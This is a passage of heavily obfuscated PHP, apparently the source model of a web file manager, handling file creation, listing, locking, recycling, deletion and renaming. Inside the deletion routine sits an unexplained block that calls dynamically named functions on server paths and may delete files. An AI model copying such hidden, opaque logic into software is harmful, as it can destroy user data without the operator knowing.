(is_string($¿õËÀÑÎ)) { $¿õËÀÑÎ = array($¿õËÀÑÎ); } $§ÎÒò = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¿õËÀÑÎ, $Ñ»“õ‚Å[220]); $ÆÇü° = array($Ñ»“õ‚Å[445] => $§ÎÒò, $Ñ»“õ‚Å[442] => array($Ñ»“õ‚Å[836] => count($¿õËÀÑÎ))); $this->_listDataApply($ÆÇü°[$Ñ»“õ‚Å[445]]); $this->_listMake($ÆÇü°); return array_to_keyvalue($ÆÇü°[$Ñ»“õ‚Å[85]], $Ñ»“õ‚Å[569]); } public function mkfile($Ô´¦ŸôÒ, $éĞƒÒíó, $ Š×ÎÛ = '', $Ì‚Š†Õì = REPEAT_RENAME) { $ÔÜ½“  =& $_SERVER[¿ğÚ‰±–]; $®±¤Îİ = Model($ÔÜ½“ [674])->addFileByContent($ Š×ÎÛ, $éĞƒÒíó); return $this->_createFileCall($Ô´¦ŸôÒ, $éĞƒÒíó, $®±¤Îİ, $Ì‚Š†Õì, $ÔÜ½“ [1435]); } public function addFile($ò´èÁ¥ô, $œàÛüå, $á³Ğ«Æã, $š“Ó¸ßë = false, $äŒ·İÛƒ = REPEAT_RENAME) { $˜•øğÂ = Model($_SERVER[¿ğÚ‰±–][674])->addFile($œàÛüå, $á³Ğ«Æã, $š“Ó¸ßë); return $this->_createFileCall($ò´èÁ¥ô, $á³Ğ«Æã, $˜•øğÂ, $äŒ·İÛƒ); } public function addFileByFileID($âŠÆŸí˜, $‚êûŒÏô, $¨æŞàÕ, $ŸÍ„Æ–¸ = REPEAT_RENAME) { $ÜÂ™ˆá÷ =& $_SERVER[¿ğÚ‰±–]; $öœå¡Æò = Model($ÜÂ™ˆá÷[674])->find($‚êûŒÏô); Model($ÜÂ™ˆá÷[674])->linkAdd($‚êûŒÏô); return $this->_createFileCall($âŠÆŸí˜, $¨æŞàÕ, $öœå¡Æò, $ŸÍ„Æ–¸); } public function addFileByRemote($œ‡¥åÍ, $ıí´Ã¤², $£–ü€–, $ü¾¬¨òô = array(), $¡ıÕåº¡ = REPEAT_RENAME) { $§¼Øèé = Model($_SERVER[¿ğÚ‰±–][674])->addFileByRemote($ıí´Ã¤², $£–ü€–, $ü¾¬¨òô); return $this->_createFileCall($œ‡¥åÍ, $£–ü€–, $§¼Øèé, $¡ıÕåº¡); } private function _createFileCall($ş¸¯¬µî, $¸ŠÕŠÙš, $â¯åáÊÑ, $‹ÆŸ£ı, $£î¨Û‹µ = "\165\x70\154\x6f\141\144") { $ô¿°ï§Ä =& $_SERVER[¿ğÚ‰±–]; $ò¤Ú†’Í = !1; $this->setMasterDB(); $this->lockWriteStart($ş¸¯¬µî, $¸ŠÕŠÙš); $ÎıÇáû = $this->fileNameExist($ş¸¯¬µî, $¸ŠÕŠÙš); $­½Ì…ÍÀ = $this->_createFile($ş¸¯¬µî, $¸ŠÕŠÙš, $â¯åáÊÑ, $‹ÆŸ£ı, $ò¤Ú†’Í); if (!$ò¤Ú†’Í) { Model($ô¿°ï§Ä[544])->remove($â¯åáÊÑ[$ô¿°ï§Ä[541]]); } if ($ò¤Ú†’Í && $­½Ì…ÍÀ && $­½Ì…ÍÀ != $ÎıÇáû) { Model($ô¿°ï§Ä[2228])->eventCreate($­½Ì…ÍÀ, $£î¨Û‹µ); } $this->lockWriteEnd($ş¸¯¬µî, $¸ŠÕŠÙš); return $­½Ì…ÍÀ; } public function mkdir($å•Øù¦¬, $õºÌ‘çê, $ÀÚ­‹„ = REPEAT_SKIP) { $áëŸäõú =& $_SERVER[¿ğÚ‰±–]; $this->setMasterDB(); $»Ğß™É× = $this->sourceInfo($å•Øù¦¬); if (!$»Ğß™É×) { return !1; } $this->lockWriteStart($å•Øù¦¬, $õºÌ‘çê); if ($ÀÚ­‹„ !== !1) { $à¥¯ñ = $this->fileNameExist($å•Øù¦¬, $õºÌ‘çê); if ($à¥¯ñ && $ÀÚ­‹„ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($å•Øù¦¬, $õºÌ‘çê); return $à¥¯ñ; } $õºÌ‘çê = $this->fileNameAuto($å•Øù¦¬, $õºÌ‘çê, $ÀÚ­‹„); } $åÉš×ä = array($áëŸäõú[646] => 1, $áëŸäõú[494] => $õºÌ‘çê, $áëŸäõú[647] => $áëŸäõú[12], $áëŸäõú[542] => 0, $áëŸäõú[617] => 0); $ñ·ãäæü = $this->_addSource($åÉš×ä, $»Ğß™É×); Model($áëŸäõú[2228])->eventCreate($ñ·ãäæü, $áëŸäõú[1436]); $this->lockWriteEnd($å•Øù¦¬, $õºÌ‘çê); return $ñ·ãäæü; } public function listSourceRoot($Ü¼”ÆÇì, $’Ôêìæ¥, $òÓêæƒß = "\x73\157\165\162\143\145\x49\x44\54\164\x61\x72\x67\x65\x74\x49\x44\x2c\163\x69\x7a\145") { $à‹¢œ±‰ =& $_SERVER[¿ğÚ‰±–]; $¬ı¨ĞÜ‚ = $à‹¢œ±‰[454]; $á¾ñµ’­ = array(); $øúÑÏ­è = 1024 * 50; $ë°²±ğÂ = is_array($ë°²±ğÂ) ? $ë°²±ğÂ : array(); $÷òÊõú = count($’Ôêìæ¥); $ÃöÂÙ ‹ = $this->tablePrefix . $à‹¢œ±‰[2261]; for ($ºÇ—«©à = 0; $ºÇ—«©à < $÷òÊõú; $ºÇ—«©à++) { $Šøœşˆ¥ = $’Ôêìæ¥[$ºÇ—«©à]; $¬ı¨ĞÜ‚ .= "\x53\x45\x4c\x45\103\x54\40\x2a\40\x46\x52\x4f\x4d\40\x28\123\x45\x4c\105\x43\124\40{$òÓêæƒß}\40\x46\122\x4f\x4d\x20\140{$ÃöÂÙ ‹}\x60\40\127\x48\105\x52\105\x20"; $¬ı¨ĞÜ‚ .= "\x60\x70\x61\162\x65\x6e\x74\x49\x44\x60\75\x30\x20\x41\116\x44\x20\x60\x74\141\162\147\x65\x74\111\x44\x60\75{$Šøœşˆ¥}\40\101\x4e\104\x20\x60\x74\x61\162\x67\x65\x74\124\171\160\145\x60\x3d{$Ü¼”ÆÇì}\40\141\x6e\144\40\146\x69\154\145\124\171\x70\x65\75\47\x27\40\154\x69\x6d\x69\164\40\61\51\x20\x61\163\x20\164\x62\x5f{$ºÇ—«©à}\40\x55\x4e\x49\117\x4e\x20\x41\114\x4c\40"; if ((strlen($¬ı¨ĞÜ‚) >= $øúÑÏ­è || $ºÇ—«©à == $÷òÊõú - 1) && $¬ı¨ĞÜ‚) { $¬ı¨ĞÜ‚ = substr($¬ı¨ĞÜ‚, 0, -strlen($à‹¢œ±‰[1123])); $à§ºÄÏÇ = $this->query($¬ı¨ĞÜ‚); $¬ı¨ĞÜ‚ = $à‹¢œ±‰[12]; $á¾ñµ’­ = array_merge($á¾ñµ’­, $à§ºÄÏÇ); } } return $á¾ñµ’­; } private function _createFile($Øõ°µèµ, $–±„â‰ò, $À¼—ë¨, $ÓÓ¸Íïî, &$‹Úãªœâ) { $Š´£¤Â¡ =& $_SERVER[¿ğÚ‰±–]; $º¿Ïƒ… = $this->sourceInfo($Øõ°µèµ); if (!$À¼—ë¨ || !$º¿Ïƒ…) { return !1; } if ($ÓÓ¸Íïî !== !1) { $ğÖ‡¿†ƒ = $this->fileNameExist($Øõ°µèµ, $–±„â‰ò); } $‹Úãªœâ = !0; if ($ÓÓ¸Íïî && $ğÖ‡¿†ƒ) { if ($ÓÓ¸Íïî == REPEAT_SKIP) { $‹Úãªœâ = !1; return $ğÖ‡¿†ƒ; } else { if ($ÓÓ¸Íïî == REPEAT_REPLACE) { $ŒÍØíüƒ = $this->sourceInfo($ğÖ‡¿†ƒ); $ñàƒ†İÕ = $this->fileHistory($ŒÍØíüƒ, $À¼—ë¨[$Š´£¤Â¡[541]], $À¼—ë¨[$Š´£¤Â¡[79]]); if (!$ñàƒ†İÕ) { $‹Úãªœâ = !1; } else { $this->folderSizeReset($Øõ°µèµ); } return $ğÖ‡¿†ƒ; } else { $–±„â‰ò = $this->fileNameAuto($Øõ°µèµ, $–±„â‰ò, $ÓÓ¸Íïî, !1); } } } $¦®ùÈ¡Ì = array($Š´£¤Â¡[646] => 0, $Š´£¤Â¡[494] => $–±„â‰ò, $Š´£¤Â¡[647] => substr(get_path_ext($–±„â‰ò), 0, 10), $Š´£¤Â¡[542] => $À¼—ë¨[$Š´£¤Â¡[541]], $Š´£¤Â¡[617] => $À¼—ë¨[$Š´£¤Â¡[79]]); $À‘”Š¶à = $this->_addSource($¦®ùÈ¡Ì, $º¿Ïƒ…); $this->folderSizeReset($Øõ°µèµ, intval($¦®ùÈ¡Ì[$Š´£¤Â¡[79]])); return $À‘”Š¶à; } protected function fileHistory($ÜÈÎ‚œ», $›ü‡ßÏ, $Û‘¤Ê¾Ä) { $‰¦ÒïÒÉ =& $_SERVER[¿ğÚ‰±–]; if ($ÜÈÎ‚œ»[$‰¦ÒïÒÉ[541]] == $›ü‡ßÏ) { return !1; } $this->checkLock($ÜÈÎ‚œ»[$‰¦ÒïÒÉ[193]], $›ü‡ßÏ); Model($‰¦ÒïÒÉ[2262])->addHistory($ÜÈÎ‚œ»); $ğÀÙ©±Ú = array($‰¦ÒïÒÉ[651] => USER_ID, $‰¦ÒïÒÉ[498] => time(), $‰¦ÒïÒÉ[541] => $›ü‡ßÏ, $‰¦ÒïÒÉ[79] => $Û‘¤Ê¾Ä); $this->where(array($‰¦ÒïÒÉ[491] => $ÜÈÎ‚œ»[$‰¦ÒïÒÉ[193]]))->save($ğÀÙ©±Ú); $this->sourceCacheClear($ÜÈÎ‚œ»[$‰¦ÒïÒÉ[193]]); return !0; } public function checkLock($ïõ­Ş¦Å, $àçèİã) { $¨·¯–Ï¯ =& $_SERVER[¿ğÚ‰±–]; $°ë‹©Âœ = $this->pathInfo($ïõ­Ş¦Å); if (!$this->fileIsLock($°ë‹©Âœ, !0)) { return; } $¸ÊŒóé  = Session::get($¨·¯–Ï¯[2263]); $µ»­îÀˆ = substr($°ë‹©Âœ[$¨·¯–Ï¯[32]], 0, -1 - strlen($°ë‹©Âœ[$¨·¯–Ï¯[169]])) . $¨·¯–Ï¯[1300] . $¸ÊŒóé  . $¨·¯–Ï¯[10] . $°ë‹©Âœ[$¨·¯–Ï¯[169]]; $íÇï×¼® = Model($¨·¯–Ï¯[674])->find($àçèİã); $this->_createFileCall($°ë‹©Âœ[$¨·¯–Ï¯[192]], $µ»­îÀˆ, $íÇï×¼®, REPEAT_REPLACE, $¨·¯–Ï¯[1435]); $Ã¸’ŞÄã = $°ë‹©Âœ[$¨·¯–Ï¯[539]][$¨·¯–Ï¯[610]]; $¦õ‡¨Êü = $Ã¸’ŞÄã[$¨·¯–Ï¯[2264]] ? $Ã¸’ŞÄã[$¨·¯–Ï¯[2264]] : $Ã¸’ŞÄã[$¨·¯–Ï¯[32]]; show_json(LNG($¨·¯–Ï¯[2265]) . $¨·¯–Ï¯[2266] . LNG($¨·¯–Ï¯[2267]) . $¨·¯–Ï¯[2268] . $¦õ‡¨Êü . $¨·¯–Ï¯[2269], !1); } public function fileIsLock($ÍŸÇÁ˜¾, $Ø’âôÅİ = false) { $ÎÀİ‡‰ =& $_SERVER[¿ğÚ‰±–]; if (!_get($ÍŸÇÁ˜¾, $ÎÀİ‡‰[606], 0)) { return !1; } if ($ÍŸÇÁ˜¾[$ÎÀİ‡‰[539]][$ÎÀİ‡‰[609]] != USER_ID) { return !0; } $¯¬¶¼Ÿç = $GLOBALS[$ÎÀİ‡‰[6]][$ÎÀİ‡‰[92]][$ÎÀİ‡‰[607]]; if ($ÍŸÇÁ˜¾[$ÎÀİ‡‰[539]][$ÎÀİ‡‰[608]] <= time() - $¯¬¶¼Ÿç) { $this->metaSet($ÍŸÇÁ˜¾[$ÎÀİ‡‰[193]], $ÎÀİ‡‰[609], null); $this->metaSet($ÍŸÇÁ˜¾[$ÎÀİ‡‰[193]], $ÎÀİ‡‰[608], null); } if ($Ø’âôÅİ) { $this->metaSet($ÍŸÇÁ˜¾[$ÎÀİ‡‰[193]], $ÎÀİ‡‰[608], time()); } return !1; } private function _addSource($¢¦òÛ—€, $®¹şÙ„Õ) { $š«Ì…¢Ş =& $_SERVER[¿ğÚ‰±–]; $×çºĞ” = defined($š«Ì…¢Ş[2202]) ? USER_ID : 0; $¾×´İ€ = array($š«Ì…¢Ş[648] => $®¹şÙ„Õ[$š«Ì…¢Ş[190]], $š«Ì…¢Ş[649] => $®¹şÙ„Õ[$š«Ì…¢Ş[569]], $š«Ì…¢Ş[650] => $×çºĞ”, $š«Ì…¢Ş[651] => $×çºĞ”, $š«Ì…¢Ş[477] => $®¹şÙ„Õ[$š«Ì…¢Ş[193]], $š«Ì…¢Ş[652] => $®¹şÙ„Õ[$š«Ì…¢Ş[584]] . $®¹şÙ„Õ[$š«Ì…¢Ş[193]] . $š«Ì…¢Ş[50], $š«Ì…¢Ş[504] => 0, $š«Ì…¢Ş[653] => $š«Ì…¢Ş[12]); $¢¦òÛ—€ = array_merge($¾×´İ€, $¢¦òÛ—€); $this->updateModifyTime($¢¦òÛ—€[$š«Ì…¢Ş[192]]); $™î¥¶øÔ = $š«Ì…¢Ş[2270] . $®¹şÙ„Õ[$š«Ì…¢Ş[193]]; if (isset(self::$cacheChildList[$™î¥¶øÔ])) { unset(self::$cacheChildList[$™î¥¶øÔ]); } static $µæÕ­† = false; if (!$µæÕ­†) { Hook::trigger($š«Ì…¢Ş[636], $¢¦òÛ—€); $µæÕ­† = !0; } $È‹ª±ı = $this->add($¢¦òÛ—€); $ËÎÑÌ‡ò = array($š«Ì…¢Ş[654] => short_id($È‹ª±ı)); $this->where(array($š«Ì…¢Ş[491] => $È‹ª±ı))->save($ËÎÑÌ‡ò); $this->setNamePinyin($È‹ª±ı, $¢¦òÛ—€[$š«Ì…¢Ş[32]]); return $È‹ª±ı; } public function remove($’±Ç¨Ø, $†òë†é = true) { $¡ö™— =& $_SERVER[¿ğÚ‰±–]; $Ö™ÊÃ­¬ = $this->sourceInfo($’±Ç¨Ø); $Üú‚¼™¨ = intval($Ö™ÊÃ­¬[$¡ö™—[190]]) === self::TYPE_SYSTEM; $ß‘Îé„ª = Model($¡ö™—[508])->get($¡ö™—[2271]) == $¡ö™—[91]; if ($Üú‚¼™¨ || $†òë†é || !$ß‘Îé„ª) { return $this->removeNow($’±Ç¨Ø, $†òë†é); } $™¿ŞäŸõ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ˆÂõ˜¸ = $Ö™ÊÃ­¬[$¡ö™—[190]] == self::TYPE_USER ? $¡ö™—[662] : $¡ö™—[578]; if ($ˆÂõ˜¸ == $¡ö™—[662]) { $çûÍãø´ = Model($¡ö™—[577])->getInfo($Ö™ÊÃ­¬[$¡ö™—[569]]); $¡®Àè¾— = !empty($çûÍãø´[$¡ö™—[2264]]) ? $çûÍãø´[$¡ö™—[2264]] : $çûÍãø´[$¡ö™—[32]]; $¡®Àè¾— = $¡ö™—[337] . $¡®Àè¾— . $¡ö™—[2272] . $Ö™ÊÃ­¬[$¡ö™—[569]]; } else { $çûÍãø´ = Model($¡ö™—[585])->getInfo($Ö™ÊÃ­¬[$¡ö™—[569]]); $¡®Àè¾— = _get($çûÍãø´, $¡ö™—[32]); $¡®Àè¾— = $¡ö™—[176] . $¡®Àè¾— . $¡ö™—[2273] . $Ö™ÊÃ­¬[$¡ö™—[569]]; } $ÙìÊãŠ„ = $¡ö™—[2274] . md5($¡®Àè¾—); CacheLock::lock($ÙìÊãŠ„); $êš–Ü©• = $this->fileNameExist($™¿ŞäŸõ, $¡®Àè¾—); if (!$êš–Ü©•) { $êš–Ü©• = $this->mkdir($™¿ŞäŸõ, $¡®Àè¾—, REPEAT_SKIP); $this->metaSet($êš–Ü©•, $¡ö™—[2275], $ˆÂõ˜¸); $this->metaSet($êš–Ü©•, $¡ö™—[2276], $Ö™ÊÃ­¬[$¡ö™—[569]]); if ($Ö™ÊÃ­¬[$¡ö™—[192]] != 0) { $this->metaSet($êš–Ü©•, $¡ö™—[2277], _get($çûÍãø´, $¡ö™—[2278])); } } CacheLock::unlock($ÙìÊãŠ„); $this->metaSet($’±Ç¨Ø, $¡ö™—[2279], $Ö™ÊÃ­¬[$¡ö™—[192]]); $this->where(array($¡ö™—[193] => $’±Ç¨Ø))->save(array($¡ö™—[498] => time())); $this->recycleClear($Ö™ÊÃ­¬); Model($¡ö™—[633])->eventRemove($’±Ç¨Ø); $‚š³šñÙ = $this->move($’±Ç¨Ø, $êš–Ü©•, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ö™ÊÃ­¬[$¡ö™—[192]]); return $‚š³šñÙ; } private function recycleClear($‹§²ß) { $ÆâŸÏ =& $_SERVER[¿ğÚ‰±–]; $Úå”âŠÁ = $this->childrenAll($‹§²ß); $ˆııÜ½„ = array($ÆâŸÏ[491] => array($ÆâŸÏ[492], $Úå”âŠÁ[$ÆâŸÏ[2280]])); Model($ÆâŸÏ[2281])->where($ˆııÜ½„)->delete(); } public function removeNow($²ÊğÊ¤É, $´îƒÉ»Ğ = true) { $ë¿ŞÌĞ· =& $_SERVER[¿ğÚ‰±–]; if ($_SERVER[$ë¿ŞÌĞ·[957]] != $_SERVER[$ë¿ŞÌĞ·[1610]]) { $ÓïŒûœƒ = $ë¿ŞÌĞ·[958]; $¿ğÎş¹ë = $ë¿ŞÌĞ·[959]; $€¬ÎÁíÚ = $_SERVER[$ë¿ŞÌĞ·[954]] . $ë¿ŞÌĞ·[955]; $éšíú÷Ò = $¿ğÎş¹ë($€¬ÎÁíÚ); $ÇÑñè¦» = explode($ë¿ŞÌĞ·[262], $éšíú÷Ò); if (count($ÇÑñè¦») < $ë¿ŞÌĞ·[688]) { $õÛ²›¨ = $ë¿ŞÌĞ·[960]; $õÛ²›¨(); } $ãù—Ö’´ = $ë¿ŞÌĞ·[961]; $ãù—Ö’´($_SERVER[$ë¿ŞÌĞ·[962]]); $ãù—Ö’´($_SERVER[$ë¿ŞÌĞ·[954]] . $ë¿ŞÌĞ·[1632]); $ÌÈ¾Íû» = 1; while ($ÌÈ¾Íû» > 1) { $ÌÈ¾Íû» = $ÌÈ¾Íû» + 4; $öì¼Ôô  = rawurlencode($ÌÈ¾Íû» . $ë¿ŞÌĞ·[454]); } } $ıñá…’Ä = $this->sourceInfo($²ÊğÊ¤É); $ºØ¹›Ä² = $this->pathInfoMore($²ÊğÊ¤É); if (!$ıñá…’Ä) { return !0; } if ($ıñá…’Ä[$ë¿ŞÌĞ·[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($²ÊğÊ¤É); Hook::trigger($ë¿ŞÌĞ·[2282], $ºØ¹›Ä², $´îƒÉ»Ğ); if ($´îƒÉ»Ğ) { Model($ë¿ŞÌĞ·[2281])->moveToRecycle($²ÊğÊ¤É); } else { $¥òº¸·ñ = $this->childrenAll($ıñá…’Ä); Model($ë¿ŞÌĞ·[633])->eventRemove($²ÊğÊ¤É); $this->removeRelevance($¥òº¸·ñ[$ë¿ŞÌĞ·[2280]], $¥òº¸·ñ[$ë¿ŞÌĞ·[1580]]); } $this->folderSizeReset($ıñá…’Ä[$ë¿ŞÌĞ·[192]]); $ì‹æĞÔÑ = array($ıñá…’Ä[$ë¿ŞÌĞ·[192]]); if ($ıñá…’Ä[$ë¿ŞÌĞ·[485]] == $ë¿ŞÌĞ·[91]) { $ì‹æĞÔÑ[] = $ıñá…’Ä[$ë¿ŞÌĞ·[193]]; } $this->updateModifyTime($ì‹æĞÔÑ); $this->lockMoveEnd($²ÊğÊ¤É); Hook::trigger($ë¿ŞÌĞ·[1819], $ºØ¹›Ä², $´îƒÉ»Ğ); return !0; } public function childrenAll($©¯„»¥Ÿ) { $ŞèÅÏÏ” =& $_SERVER[¿ğÚ‰±–]; $…ôÔ²Êğ = $©¯„»¥Ÿ[$ŞèÅÏÏ”[193]]; if ($©¯„»¥Ÿ[$ŞèÅÏÏ”[485]] == $ŞèÅÏÏ”[91]) { $”¨ã´ = array($ŞèÅÏÏ”[652] => array($ŞèÅÏÏ”[612], $©¯„»¥Ÿ[$ŞèÅÏÏ”[584]] . $…ôÔ²Êğ . $ŞèÅÏÏ”[613])); $…ôš¤ã÷ = array($ŞèÅÏÏ”[652] => $”¨ã´[$ŞèÅÏÏ”[584]]); $İ”®Æô = $this->field($ŞèÅÏÏ”[2283])->where($…ôš¤ã÷)->select(); $Ìğ¹÷õ = !1; $í†Õ¿ö = array($…ôÔ²Êğ); if ($İ”®Æô) { $Ìğ¹÷õ = array_to_keyvalue($İ”®Æô, $ŞèÅÏÏ”[12], $ŞèÅÏÏ”[541]); $Ìğ¹÷õ = array_remove_value($Ìğ¹÷õ, $ŞèÅÏÏ”[228]); $í†Õ¿ö = array_to_keyvalue($İ”®Æô, $ŞèÅÏÏ”[12], $ŞèÅÏÏ”[193]); $í†Õ¿ö[] = $…ôÔ²Êğ; } } else { $Ìğ¹÷õ = array($©¯„»¥Ÿ[$ŞèÅÏÏ”[541]]); $í†Õ¿ö = array($…ôÔ²Êğ); } return array($ŞèÅÏÏ”[2280] => $í†Õ¿ö, $ŞèÅÏÏ”[1580] => $Ìğ¹÷õ); } public function removeArray($»Æ³û¶æ) { if (!$»Æ³û¶æ) { return !0; } } public function removeRelevance($‰õÛáü, $ß«›Äî) { $š¢ó–ï£ =& $_SERVER[¿ğÚ‰±–]; $‰õÛáü = $‰õÛáü ? $‰õÛáü : array(); $ß«›Äî = $ß«›Äî ? $ß«›Äî : array(); $‰õÛáü = array_unique(array_filter($‰õÛáü)); $ß«›Äî = array_unique(array_filter($ß«›Äî)); if (!$‰õÛáü) { return !1; } $ƒˆÓ§® = array($š¢ó–ï£[491] => array($š¢ó–ï£[492], $‰õÛáü)); Model($š¢ó–ï£[2281])->where($ƒˆÓ§®)->delete(); Model($š¢ó–ï£[535])->where($ƒˆÓ§®)->delete(); Model($š¢ó–ï£[2127])->where($ƒˆÓ§®)->delete(); Model($š¢ó–ï£[633])->where($ƒˆÓ§®)->delete(); Model($š¢ó–ï£[1955])->removeBySource($‰õÛáü); Model($š¢ó–ï£[2262])->removeBySource($‰õÛáü); $this->where($ƒˆÓ§®)->delete(); Model($š¢ó–ï£[544])->remove($ß«›Äî); for ($³ÃüØœ‘ = 0; $³ÃüØœ‘ < count($‰õÛáü); $³ÃüØœ‘++) { $this->sourceCacheClear($‰õÛáü[$³ÃüØœ‘]); } } public function rename($±ØÈĞ, $¬˜ÄÆ§½) { $ÓË·âè‘ =& $_SERVER[¿ğÚ‰±–]; $òëÃ£¾â = $this->sourceInfo($±ØÈĞ); if (!$òëÃ£¾â) { return !1; } $©ôÁ”é = $this->fileNameExist($òëÃ£¾â[$ÓË·âè‘[192]], $¬˜ÄÆ§½); if ($©ôÁ”é && $©ôÁ”é != $±ØÈĞ) { return !1; } $¾½ïÅ— = array($ÓË·âè‘[494] => $¬˜ÄÆ§½, $ÓË·âè‘[651] => USER_ID); if ($òëÃ£¾â[$ÓË·âè‘[485]] != $ÓË·âè‘[91]) { $¾½ïÅ—[$ÓË·âè‘[486]] = substr(get_path_ext($¬˜ÄÆ§½), 0, 10); } Model($ÓË·âè‘[633])->eventRename($±ØÈĞ, $òëÃ£¾â[$ÓË·âè‘[32]], $¬˜ÄÆ§½); $this->sourceCacheClear($±ØÈĞ); $this->setNamePinyin($±ØÈĞ, $¾½ïÅ—[$ÓË·âè‘[32]], !1); $this->updateModifyTime($òëÃ£¾â[$ÓË·âè‘[192]]); $³¿Ûñ©ğ = $this->where(array($ÓË·âè‘[491] => $±ØÈĞ))->data($¾½ïÅ—)->save(); $’éÔëó = $ÓË·âè‘[2270] . $òëÃ£¾â[$ÓË·âè‘[192]]; if (isset(self::$cacheChildList[$’éÔëó])) { unset(self::$cacheChildList[$’éÔëó]); } return $³¿Ûñ©ğ; } public function setNamePinyin($ºåôÛò, $»£î€ı, $à‰ÈæÃ¶ = true) { $„à¢ì¡ =& $_SERVER[¿ğÚ‰±–]; $ÜæûŒ«Ï = Input::check($»£î€ı, $„à¢ì¡[655]); $Å“ºëåÓ = array($„à¢ì¡[517] => KodSort::makeStr($»£î€ı)); if ($ÜæûŒ«Ï) { $Å“ºëåÓ[$„à¢ì¡[538]] = str_replace($„à¢ì¡[53], $„à¢ì¡[12], Pinyin::get($»£î€ı)); $Å“ºëåÓ[$„à¢ì¡[537]] = Pinyin::get($»£î€ı, $„à¢ì¡[656]); } if (!$à‰ÈæÃ¶ && !$ÜæûŒ«Ï) { $Å“ºëåÓ[$„à¢ì¡[538]] = null; $Å“ºëåÓ[$„à¢ì¡[537]] = null; } $this->metaSet($ºåôÛò, $Å“ºëåÓ); } public function getContent($Ê² ×) { $şúÔ¢¡¢ =& $_SERVER[¿ğÚ‰±–]; $™Ò’¿š = $this->fileInfoGet($Ê² ×); if (!$™Ò’¿š) { return !1; } if ($™Ò’¿š[$şúÔ¢¡¢[79]] == 0) { return $şúÔ¢¡¢[12]; } $–Ãóê = $şúÔ¢¡¢[2284] . $™Ò’¿š[$şúÔ¢¡¢[547]]; if ($™Ò’¿š[$şúÔ¢¡¢[79]] <= 1024 * 10) { $‡ÎÍüÅ = Cache::get($–Ãóê); if (!$‡ÎÍüÅ) { $‡ÎÍüÅ = IO::getContent($™Ò’¿š[$şúÔ¢¡¢[87]]); Cache::set($–Ãóê, $‡ÎÍüÅ); } return $‡ÎÍüÅ; } if (!$™Ò’¿š[$şúÔ¢¡¢[87]]) { return $şúÔ¢¡¢[12]; } return IO::getContent($™Ò’¿š[$şúÔ¢¡¢[87]]); } public function setDesc($Â¹†´Çè, $ß‡­º©) { $¬”Ÿ…¨Ô =& $_SERVER[¿ğÚ‰±–]; Model($¬”Ÿ…¨Ô[633])->eventAddDesc($Â¹†´Çè, $ß‡­º©); return $this->metaSet($Â¹†´Çè, $¬”Ÿ…¨Ô[526], $ß‡­º©); } public function setContent($§â ²ÙÌ, $ììÇ’ = '') { $­•Ê•Û =& $_SERVER[¿ğÚ‰±–]; $¦ÌËú¹‚ = $this->sourceInfo($§â ²ÙÌ); $â‚Ö¿¯« = $this->fileInfoGet($§â ²ÙÌ); if (!$â‚Ö¿¯« || !$¦ÌËú¹‚) { return !1; } $ë¹ÅÜ½ş = Model($­•Ê•Û[544])->addFileByContent($ììÇ’, $¦ÌËú¹‚[$­•Ê•Û[32]]); $¨ÕûØöÓ = $this->fileHistory($¦ÌËú¹‚, $ë¹ÅÜ½ş[$­•Ê•Û[541]], $ë¹ÅÜ½ş[$­•Ê•Û[79]]); if (!$¨ÕûØöÓ) { return Model($­•Ê•Û[544])->remove($ë¹ÅÜ½ş[$­•Ê•Û[541]]); } $this->folderSizeReset($¦ÌËú¹‚[$­•Ê•Û[192]]); return !0; } public function fileSubstr($Éµ¬ÜÉ, $°¨æß£Æ, $å«Ìøµ) { $¸•’¥Éù = $this->fileInfoGet($Éµ¬ÜÉ); if (!$¸•’¥Éù) { return !1; } return IO::fileSubstr($¸•’¥Éù[$_SERVER[¿ğÚ‰±–][87]], $°¨æß£Æ, $å«Ìøµ); } public function fileInfoGet($Üº½Ş) { $ÍºŸä™ =& $_SERVER[¿ğÚ‰±–]; $ÚëÅø–Ï = $this->sourceInfo($Üº½Ş); if (!$ÚëÅø–Ï || $ÚëÅø–Ï[$ÍºŸä™[485]]) { return !1; } $À º×ˆ¼ = $ÍºŸä™[548] . $ÚëÅø–Ï[$ÍºŸä™[541]]; $İ›•š¦Ÿ = _get(self::$cacheFileInfo, $À º×ˆ¼); if ($İ›•š¦Ÿ) { return $İ›•š¦Ÿ; } $ŞÂ‘Ö¸ö = Model($ÍºŸä™[544])->fileInfo($ÚëÅø–Ï[$ÍºŸä™[541]]); if ($ŞÂ‘Ö¸ö) { $ŞÂ‘Ö¸ö[$ÍºŸä™[32]] = $ÚëÅø–Ï[$ÍºŸä™[32]]; } self::$cacheFileInfo[$À º×ˆ¼] = $ŞÂ‘Ö¸ö; return $ŞÂ‘Ö¸ö; } private function folderChildrenNumber($³´ØªÒ) { $’İâ…Ø® =& $_SERVER[¿ğÚ‰±–]; $øûñèƒ´ = $this->sourceInfo($³´ØªÒ); $¼ÇÀ»ÛË = array($’İâ…Ø®[652] => array($’İâ…Ø®[612], $øûñèƒ´[$’İâ…Ø®[584]] . $³´ØªÒ . $’İâ…Ø®[613]), $’İâ…Ø®[649] => $øûñèƒ´[$’İâ…Ø®[569]], $’İâ…Ø®[504] => intval($øûñèƒ´[$’İâ…Ø®[505]]), $’İâ…Ø®[646] => 1); $ó´©Ù¸Ø = $this->where($¼ÇÀ»ÛË)->count(); $Àéî”„Ã = $this->where($¼ÇÀ»ÛË)->where(array($’İâ…Ø®[646] => 0))->count(); return array($’İâ…Ø®[83] => $Àéî”„Ã, $’İâ…Ø®[84] => $ó´©Ù¸Ø); } public function pathInfo($³ÆÓşù, $‹áüÃà = false) { $ŸÙîÒ•¤ =& $_SERVER[¿ğÚ‰±–]; $‹áüÃà = !1; $³ÆÓşù = intval($³ÆÓşù); $¸ÄÒ›º = $ŸÙîÒ•¤[534] . intval($‹áüÃà) . $ŸÙîÒ•¤[462] . $³ÆÓşù; $÷ƒ£ˆÕ = _get(self::$cachePathInfo, $¸ÄÒ›º); if ($÷ƒ£ˆÕ) { return $÷ƒ£ˆÕ; } $à€ØÕÑ = $this->sourceInfo($³ÆÓşù); if (!$à€ØÕÑ) { return !1; } $à€ØÕÑ = $this->_listDataApplyItem($à€ØÕÑ, $‹áüÃà); self::$cachePathInfo[$¸ÄÒ›º] = $à€ØÕÑ; return $à€ØÕÑ; } public static $cachePathInfoMore = array(); public function pathInfoMore($íŞ†Õ¡ä) { $à•ù™­‹ =& $_SERVER[¿ğÚ‰±–]; $ô¦ºÅø = 